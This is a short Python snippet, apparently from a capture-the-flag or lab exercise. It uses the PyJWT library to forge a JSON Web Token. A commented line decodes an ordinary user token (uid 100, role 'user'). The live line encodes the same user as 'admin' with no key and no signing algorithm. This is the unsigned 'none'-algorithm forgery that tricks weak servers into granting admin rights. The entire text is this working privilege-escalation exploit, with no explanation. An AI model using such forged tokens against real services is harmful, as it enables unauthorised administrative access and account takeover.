import jwt
# print(jwt.decode('eyJ1aWQiOiAxMDAsICJyb2xlIjogInVzZXIifQ', algorithms=None))
print(jwt.encode({'uid':100, 'role':'admin'}, key=None, algorithm=None))
# eyJ1aWQiOiAxMDAsICJyb2xlIjogInVzZXIifQ